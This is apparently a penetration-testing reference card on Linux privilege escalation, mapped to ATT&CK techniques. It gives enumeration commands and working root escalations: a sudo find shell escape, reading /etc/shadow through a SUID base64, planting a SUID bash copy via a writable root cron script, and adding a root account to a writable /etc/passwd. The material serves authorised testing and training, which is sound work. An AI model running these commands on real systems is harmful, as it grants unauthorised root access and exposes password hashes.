---
tool: Linux privilege escalation
slug: linux-privesc
kind: technique
stages: [installation]
category: Local root on Linux
platforms: [linux]
services: []
ports: []
tags: [privilege-escalation, sudo, suid, cron, capabilities, gtfobins]
attack: [T1548.001, T1068, T1053.003]
summary: The checks that turn a user shell into root: sudo rights, SUID binaries, cron jobs, capabilities, writable files and PATH. Run the enumeration, then exploit the one good finding.
references:
  - GTFOBins | https://gtfobins.github.io/
  - HackTricks Linux privesc | https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
---

## Enumerate

```bash
id; sudo -l                               # what can I run as root?
find / -perm -4000 -type f 2>/dev/null    # SUID binaries
getcap -r / 2>/dev/null                   # file capabilities
cat /etc/crontab; ls -la /etc/cron.*      # scheduled jobs
ls -la /etc/passwd /etc/shadow            # writable?
uname -a; cat /etc/os-release             # kernel / distro for known exploits
```

Or run [linPEAS](/cpts/#tool-peass) and read the red findings first.

## Common wins

```bash
# sudo entry with a GTFOBins escape
sudo -l            # e.g. (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit
# SUID GTFOBins binary
/usr/bin/base64 /etc/shadow | base64 -d   # read as root via a SUID base64
# Writable cron script that runs as root
echo 'cp /bin/bash /tmp/rb; chmod 4777 /tmp/rb' >> /path/writable.sh
# PATH hijack: a script calls a binary by name, and you control an earlier PATH dir
# Writable /etc/passwd: add a root user with a known password
openssl passwd -1 -salt x pass            # -> put root:$1$...:0:0:/root:/bin/bash
```

## Notes

Always check [GTFOBins](https://gtfobins.github.io/) for a sudo or SUID binary you find: it lists the exact escape. Prefer a config win (sudo, cron, SUID, capability) over a kernel exploit, which can crash the box. Confirm you are root (`id`) and note the exact path for the report.
